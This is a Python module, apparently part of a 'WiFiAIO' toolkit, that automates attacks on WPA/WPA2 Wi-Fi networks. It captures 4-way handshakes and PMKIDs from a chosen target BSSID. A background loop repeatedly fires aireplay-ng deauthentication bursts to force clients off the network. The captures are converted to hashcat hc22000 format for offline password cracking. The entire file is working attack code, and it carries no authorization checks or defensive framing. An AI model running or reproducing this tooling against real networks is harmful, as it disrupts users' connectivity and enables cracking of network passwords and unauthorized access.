"""
WiFiAIO Handshake Capture Module

Captures 4-way WPA/WPA2 handshakes and PMKID from target networks
using airodump-ng and custom frame processing.
"""

import os
import re
import time
import logging
import subprocess
import struct
import threading
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum

from wifi_aio.exceptions import (
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
    HandshakeError,
)

logger = logging.getLogger(__name__)


class CaptureState(Enum):
    """Handshake capture states."""
    IDLE = "idle"
    SCANNING = "scanning"
    CAPTURING = "capturing"
    HANDSHAKE_CAPTURED = "handshake_captured"
    PMKID_CAPTURED = "pmkid_captured"
    FAILED = "failed"


@dataclass
class HandshakeInfo:
    """Information about a captured handshake."""
    bssid: str = ""
    ssid: str = ""
    channel: int = 0
    capture_file: str = ""
    has_m1: bool = False  # Message 1 (ANonce from AP)
    has_m2: bool = False  # Message 2 (SNonce + MIC from client)
    has_m3: bool = False  # Message 3 (GTK from AP)
    has_m4: bool = False  # Message 4 (ACK from client)
    has_pmkid: bool = False
    is_complete: bool = False
    timestamp: float = 0.0
    client_mac: str = ""
    key_version: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "bssid": self.bssid,
            "ssid": self.ssid,
            "channel": self.channel,
            "capture_file": self.capture_file,
            "has_m1": self.has_m1,
            "has_m2": self.has_m2,
            "has_m3": self.has_m3,
            "has_m4": self.has_m4,
            "has_pmkid": self.has_pmkid,
            "is_complete": self.is_complete,
            "timestamp": self.timestamp,
            "client_mac": self.client_mac,
            "key_version": self.key_version,
        }

    @property
    def completion_pct(self) -> int:
        """Get handshake completion percentage."""
        parts = sum([self.has_m1, self.has_m2, self.has_m3, self.has_m4])
        if self.has_pmkid:
            return 100
        return int(parts / 4 * 100)


class HandshakeCapture:
    """
    WPA/WPA2 handshake and PMKID capture engine.

    Uses airodump-ng for packet capture with optional deauthentication
    to speed up handshake capture.
    """

    def __init__(self, interface: str = "wlan0mon",
                 output_dir: str = "/tmp/wifiaio_captures"):
        """
        Initialize HandshakeCapture.

        Args:
            interface: Monitor mode interface.
            output_dir: Directory for capture file output.
        """
        self.interface = interface
        self.output_dir = output_dir
        self._running = False
        self._state = CaptureState.IDLE
        self._airodump_process: Optional[subprocess.Popen] = None
        self._handshakes: Dict[str, HandshakeInfo] = {}
        self._deauth_thread: Optional[threading.Thread] = None

        os.makedirs(output_dir, exist_ok=True)

    def _check_root(self) -> None:
        """Verify running as root."""
        if os.geteuid() != 0:
            raise WiFiPermissionError("Handshake capture requires root privileges")

    def _set_channel(self, channel: int) -> None:
        """Set interface channel."""
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                check=True, capture_output=True, timeout=10
            )
        except subprocess.CalledProcessError as e:
            raise HandshakeError(f"Failed to set channel {channel}: {e}")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("Timeout setting channel")

    def capture_handshake(self, bssid: str, channel: int,
                          ssid: str = "",
                          timeout: int = 120,
                          deauth: bool = True,
                          deauth_interval: int = 10,
                          deauth_count: int = 5,
                          output_prefix: Optional[str] = None) -> HandshakeInfo:
        """
        Capture a WPA/WPA2 4-way handshake from a target network.

        Args:
            bssid: Target AP BSSID.
            channel: Target channel.
            ssid: Target SSID.
            timeout: Capture timeout in seconds.
            deauth: Send deauth frames to trigger handshake.
            deauth_interval: Seconds between deauth bursts.
            deauth_count: Number of deauth frames per burst.
            output_prefix: Custom output file prefix.

        Returns:
            HandshakeInfo with capture results.
        """
        self._check_root()
        self._running = True
        self._state = CaptureState.CAPTURING

        if output_prefix is None:
            safe_bssid = bssid.replace(":", "")
            output_prefix = os.path.join(self.output_dir, f"handshake_{safe_bssid}")

        info = HandshakeInfo(
            bssid=bssid,
            ssid=ssid,
            channel=channel,
            capture_file=output_prefix,
            timestamp=time.time(),
        )

        # Set channel
        self._set_channel(channel)

        # Start airodump-ng capture
        cmd = [
            "airodump-ng",
            self.interface,
            "-b", "a",  # AP only
            "--bssid", bssid,
            "-c", str(channel),
            "-w", output_prefix,
            "--output-format", "pcap",
        ]

        try:
            self._airodump_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            logger.info("Started airodump-ng capture for %s on channel %d", bssid, channel)
        except FileNotFoundError:
            raise HandshakeError("airodump-ng not found. Install aircrack-ng suite.")

        # Start deauth thread if enabled
        if deauth:
            self._deauth_thread = threading.Thread(
                target=self._deauth_loop,
                args=(bssid, channel, deauth_interval, deauth_count),
                daemon=True,
            )
            self._deauth_thread.start()

        # Monitor for handshake capture
        start_time = time.time()
        try:
            while self._running:
                elapsed = time.time() - start_time

                # Check for handshake in capture files
                if self._check_handshake_captured(output_prefix):
                    info.is_complete = True
                    self._state = CaptureState.HANDSHAKE_CAPTURED
                    logger.info("Handshake captured for %s after %.1f seconds", bssid, elapsed)
                    break

                # Check for PMKID
                if self._check_pmkid_captured(output_prefix):
                    info.has_pmkid = True
                    info.is_complete = True
                    self._state = CaptureState.PMKID_CAPTURED
                    logger.info("PMKID captured for %s after %.1f seconds", bssid, elapsed)
                    break

                # Check timeout
                if elapsed >= timeout:
                    logger.warning("Handshake capture timed out after %d seconds", timeout)
                    self._state = CaptureState.FAILED
                    break

                time.sleep(2)
        finally:
            self._running = False
            self._stop_capture()

        # Parse captured messages
        self._parse_handshake_messages(info, output_prefix)

        self._handshakes[bssid.lower()] = info
        return info

    def _deauth_loop(self, bssid: str, channel: int,
                     interval: int, count: int) -> None:
        """Send periodic deauth frames to trigger handshake."""
        while self._running:
            try:
                cmd = [
                    "aireplay-ng",
                    "-0", str(count),  # Deauth attack
                    "-a", bssid,       # AP BSSID
                    self.interface,
                ]
                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=15
                )
                logger.debug("Sent %d deauth frames to %s", count, bssid)
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass

            time.sleep(interval)

    def _check_handshake_captured(self, output_prefix: str) -> bool:
        """Check if a handshake has been captured using aircrack-ng."""
        # Look for pcap files
        pcap_files = self._find_pcap_files(output_prefix)
        if not pcap_files:
            return False

        for pcap in pcap_files:
            try:
                result = subprocess.run(
                    ["aircrack-ng", pcap],
                    capture_output=True, text=True, timeout=10,
                    input="\n"  # Exit aircrack-ng after check
                )
                output = result.stdout + result.stderr
                if "1 handshake" in output.lower() or "handshake" in output.lower():
                    # Verify it's actually captured (not just that the AP exists)
                    if re.search(r"\d+\s+handshake", output):
                        return True
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass

        return False

    def _check_pmkid_captured(self, output_prefix: str) -> bool:
        """Check if a PMKID has been captured using hcxpcapngtool."""
        pcap_files = self._find_pcap_files(output_prefix)
        if not pcap_files:
            return False

        for pcap in pcap_files:
            try:
                result = subprocess.run(
                    ["hcxpcapngtool", "-o", "/dev/null", "--show-pmkid-only", pcap],
                    capture_output=True, text=True, timeout=10
                )
                output = result.stdout + result.stderr
                if "PMKID" in output:
                    return True
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

            # Fallback: check with tshark
            try:
                result = subprocess.run(
                    ["tshark", "-r", pcap, "-Y", "eapol && wlan.fc.type_subtype == 0x00",
                     "-T", "fields", "-e", "wlan.sa"],
                    capture_output=True, text=True, timeout=10
                )
                if result.stdout.strip():
                    return True
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

        return False

    def _find_pcap_files(self, prefix: str) -> List[str]:
        """Find pcap files matching the output prefix."""
        files = []
        # airodump output format: prefix-01.cap, prefix-01.pcap, etc.
        for ext in [".cap", ".pcap", ".pcapng"]:
            # Try numbered files (airodump increments)
            for i in range(1, 10):
                path = f"{prefix}-{i:02d}{ext}"
                if os.path.isfile(path):
                    files.append(path)
            # Also try without number
            path = f"{prefix}{ext}"
            if os.path.isfile(path):
                files.append(path)
        return files

    def _parse_handshake_messages(self, info: HandshakeInfo, output_prefix: str) -> None:
        """Parse which EAPOL messages were captured."""
        pcap_files = self._find_pcap_files(output_prefix)
        if not pcap_files:
            return

        for pcap in pcap_files:
            try:
                result = subprocess.run(
                    ["tshark", "-r", pcap,
                     "-Y", "eapol",
                     "-T", "fields",
                     "-e", "wlan.sa",
                     "-e", "wlan.da",
                     "-e", "eapol.keydes.keyinfo"],
                    capture_output=True, text=True, timeout=10
                )

                for line in result.stdout.splitlines():
                    parts = line.strip().split("\t")
                    if len(parts) >= 3:
                        sa = parts[0].lower()
                        da = parts[1].lower()
                        key_info = parts[2]

                        try:
                            key_val = int(key_info, 16) if key_info.startswith("0x") else int(key_info)
                        except ValueError:
                            continue

                        # Determine message type from key info field
                        # Key Info bit layout:
                        # Bit 3: Pairwise key
                        # Bit 6: ACK (M4)
                        # Bit 7: Install
                        # Bit 8: MIC
                        # Bit 9: Secure
                        # Bit 11: Request (M2)

                        has_mic = bool(key_val & 0x0100)
                        has_ack = bool(key_val & 0x0040)
                        has_secure = bool(key_val & 0x0200)
                        is_install = bool(key_val & 0x0080)

                        if sa == info.bssid.lower():
                            # From AP: M1 or M3
                            if has_mic and is_install:
                                info.has_m3 = True
                            elif not has_mic:
                                info.has_m1 = True
                        else:
                            # From client: M2 or M4
                            info.client_mac = sa
                            if has_mic and not has_ack:
                                info.has_m2 = True
                            elif has_mic and has_ack:
                                info.has_m4 = True

            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue

        # Update completeness
        info.is_complete = info.is_complete or (info.has_m1 and info.has_m2)

    def capture_pmkid(self, bssid: str, channel: int,
                      ssid: str = "",
                      timeout: int = 60,
                      output_prefix: Optional[str] = None) -> HandshakeInfo:
        """
        Capture PMKID from a target AP using hcxdumptool.

        PMKID is sent in the first EAPOL frame by some APs and can be
        used for offline cracking without waiting for a full handshake.

        Args:
            bssid: Target AP BSSID.
            channel: Target channel.
            ssid: Target SSID.
            timeout: Capture timeout in seconds.
            output_prefix: Custom output file prefix.

        Returns:
            HandshakeInfo with PMKID capture results.
        """
        self._check_root()
        self._running = True
        self._state = CaptureState.CAPTURING

        if output_prefix is None:
            safe_bssid = bssid.replace(":", "")
            output_prefix = os.path.join(self.output_dir, f"pmkid_{safe_bssid}")

        info = HandshakeInfo(
            bssid=bssid,
            ssid=ssid,
            channel=channel,
            capture_file=output_prefix,
            timestamp=time.time(),
        )

        # Set channel
        self._set_channel(channel)

        # Create filter file for hcxdumptool
        filter_file = f"{output_prefix}_filter.txt"
        try:
            with open(filter_file, "w") as f:
                f.write(f"{bssid}\n")
        except OSError as e:
            raise HandshakeError(f"Failed to write filter file: {e}")

        pcap_file = f"{output_prefix}.pcapng"

        try:
            # Try hcxdumptool
            cmd = [
                "hcxdumptool",
                "-i", self.interface,
                "-c", str(channel),
                "--filterlist_ap", filter_file,
                "-o", pcap_file,
                "-t", str(timeout),
                "--enable_status=3",
            ]

            try:
                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=timeout + 10
                )
                output = result.stdout + result.stderr

                # Check for PMKID in output
                if "PMKID" in output:
                    info.has_pmkid = True
                    info.is_complete = True
                    self._state = CaptureState.PMKID_CAPTURED
            except FileNotFoundError:
                # Fallback to airodump + passive capture
                logger.info("hcxdumptool not found, using airodump-ng for PMKID capture")
                return self.capture_handshake(
                    bssid, channel, ssid, timeout,
                    deauth=True, output_prefix=output_prefix
                )
            except subprocess.TimeoutExpired:
                logger.warning("hcxdumptool timed out")

            # Convert to hc22000 format if we got a capture
            if os.path.isfile(pcap_file):
                hc_file = f"{output_prefix}.hc22000"
                try:
                    result = subprocess.run(
                        ["hcxpcapngtool", "-o", hc_file, pcap_file],
                        capture_output=True, text=True, timeout=30
                    )
                    if result.returncode == 0 and os.path.isfile(hc_file):
                        info.capture_file = hc_file
                        if "PMKID" in result.stdout:
                            info.has_pmkid = True
                            info.is_complete = True
                            self._state = CaptureState.PMKID_CAPTURED
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass

        finally:
            self._running = False
            # Cleanup filter file
            try:
                os.unlink(filter_file)
            except OSError:
                pass

        self._handshakes[bssid.lower()] = info
        return info

    def _stop_capture(self) -> None:
        """Stop any running capture process."""
        if self._airodump_process and self._airodump_process.poll() is None:
            self._airodump_process.terminate()
            try:
                self._airodump_process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._airodump_process.kill()
                self._airodump_process.wait()
            self._airodump_process = None

        self._running = False

    def get_state(self) -> CaptureState:
        """Get current capture state."""
        return self._state

    def get_handshake(self, bssid: str) -> Optional[HandshakeInfo]:
        """Get captured handshake info for a BSSID."""
        return self._handshakes.get(bssid.lower())

    def get_all_handshakes(self) -> Dict[str, HandshakeInfo]:
        """Get all captured handshake info."""
        return dict(self._handshakes)

    def convert_to_hc22000(self, capture_file: str, output_file: Optional[str] = None) -> str:
        """
        Convert a capture file to hashcat hc22000 format.

        Args:
            capture_file: Input pcap file path.
            output_file: Output hash file path.

        Returns:
            Path to the generated hc22000 file.
        """
        if output_file is None:
            output_file = capture_file.rsplit(".", 1)[0] + ".hc22000"

        try:
            result = subprocess.run(
                ["hcxpcapngtool", "-o", output_file, capture_file],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode != 0:
                raise HandshakeError(f"hcxpcapngtool conversion failed: {result.stderr}")
        except FileNotFoundError:
            raise HandshakeError("hcxpcapngtool not found. Install hcxtools.")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("hcxpcapngtool conversion timed out")

        if not os.path.isfile(output_file):
            raise HandshakeError(f"Conversion produced no output file: {output_file}")

        return output_file

    def stop(self) -> None:
        """Stop any running capture."""
        self._running = False
        self._stop_capture()
        self._state = CaptureState.IDLE
        logger.info("Handshake capture stopped")

    def is_running(self) -> bool:
        """Check if a capture is in progress."""
        return self._running
